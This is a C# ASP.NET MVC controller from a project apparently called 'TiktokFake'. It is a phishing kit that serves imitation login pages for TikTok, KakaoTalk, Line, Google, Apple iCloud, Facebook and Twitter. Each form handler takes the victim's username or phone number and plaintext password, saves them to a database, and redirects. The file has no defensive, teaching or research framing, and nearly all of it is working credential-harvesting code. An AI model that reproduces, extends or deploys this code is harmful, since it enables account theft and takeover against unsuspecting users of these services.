using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Mvc;
using TiktokFake.Models;

namespace TiktokFake.Controllers
{
    public class HomeController : Controller
    {
        dbTikTokFakeDataContext db = new dbTikTokFakeDataContext();
        public ActionResult Main() { return View(); }

        public ActionResult DangKy() { return View(); }

        public ActionResult QR() { return View(); }

        [HttpGet]
        public ActionResult KakaoTalk() { return View(); }
        [HttpPost]
        public ActionResult KakaoTalk(FormCollection collection, KaKaoAccount kk) 
        {
            var user = collection["uname"];
            var pass = collection["psw"];
            kk.IDorEmailorPhone = user;
            kk.Pass = pass;
            db.KaKaoAccounts.InsertOnSubmit(kk);
            db.SubmitChanges();
            return RedirectToAction("Main"); 
        }

        [HttpGet]
        public ActionResult Line() { return View(); }
        [HttpPost]
        public ActionResult Line(FormCollection collection, LineAccount line)
        {
            var mail = collection["mail"];
            var pass = collection["psw"];
            line.Mail = mail;
            line.Pass = pass;
            db.LineAccounts.InsertOnSubmit(line);
            db.SubmitChanges();
            return RedirectToAction("Main");
        }

        [HttpGet]
        public ActionResult SDT() { return View(); }
        [HttpPost]
        public ActionResult SDT(FormCollection collection, TikTokAccount toptop)
        {
            var sdt = collection["sdt"];
            var pass = collection["psw"];
            toptop.SDTorMailorTTID = sdt;
            toptop.pass = pass;
            db.TikTokAccounts.InsertOnSubmit(toptop);
            db.SubmitChanges();
            return RedirectToAction("Main");
        }

        [HttpGet]
        public ActionResult EmailorID() { return View(); }
        [HttpPost]
        public ActionResult EmailorID(FormCollection collection, TikTokAccount toptop)
        {
            var email = collection["email"];
            var pass = collection["psw"];
            toptop.SDTorMailorTTID = email;
            toptop.pass = pass;
            db.TikTokAccounts.InsertOnSubmit(toptop);
            db.SubmitChanges();
            return RedirectToAction("Main");
        }

        [HttpGet]
        public ActionResult Google() { return View(); }
        [HttpPost]
        public ActionResult Google(FormCollection collection, Gmail gmail)
        {
            var mail = collection["mail"];
            var pass = collection["psw"];
            gmail.Gmail1 = mail;
            gmail.Pass = pass;
            db.Gmails.InsertOnSubmit(gmail);
            db.SubmitChanges();
            return RedirectToAction("Main");
        }

        [HttpGet]
        public ActionResult Apple() { return View(); }
        [HttpPost]
        public ActionResult Apple(FormCollection collection, Icloud ap)
        {
            var user = collection["uname"];
            var pass = collection["psw"];
            ap.Icloud1 = user;
            ap.Pass = pass;
            db.Iclouds.InsertOnSubmit(ap);
            db.SubmitChanges();
            return RedirectToAction("Main");
        }

        [HttpGet]
        public ActionResult Facebook() { return View(); }
        [HttpPost]
        public ActionResult Facebook(FormCollection collection, FacebookAcount fb)
        {
            var mail = collection["mail"];
            var pass = collection["psw"];
            fb.SDTorEmail = mail;
            fb.Pass = pass;
            db.FacebookAcounts.InsertOnSubmit(fb);
            db.SubmitChanges();
            return RedirectToAction("Main");
        }

        public ActionResult Instagram() { return View(); }

        [HttpGet]
        public ActionResult Twitter() { return View(); }
        [HttpPost]
        public ActionResult Twitter(FormCollection collection, TwitterAccount tw)
        {
            var mail = collection["mail"];
            var pass = collection["psw"];
            tw.twAccount = mail;
            tw.Pass = pass;
            db.TwitterAccounts.InsertOnSubmit(tw);
            db.SubmitChanges();
            return RedirectToAction("Main");
        }
    }
}